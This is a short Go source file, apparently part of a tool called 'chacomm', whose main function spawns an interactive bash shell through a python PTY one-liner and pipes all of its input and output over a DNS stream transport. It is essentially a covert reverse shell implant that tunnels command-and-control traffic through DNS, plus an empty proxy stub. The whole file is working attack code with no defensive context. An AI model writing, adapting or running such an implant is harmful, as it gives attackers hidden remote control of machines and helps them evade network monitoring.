package main

import (
	"chacomm/transport"
	"os/exec"
)

func main(){
	RunShell()
}

func RunShell(){

	cmd := exec.Command("/bin/sh", "-c", "python -c 'import pty;pty.spawn(\"/bin/bash\")'")

	dnsTransport := transport.DNSStream()

	cmd.Stdout = dnsTransport
	cmd.Stderr = dnsTransport
	cmd.Stdin = dnsTransport
	cmd.Run()

}

func RunProxy(){
	
}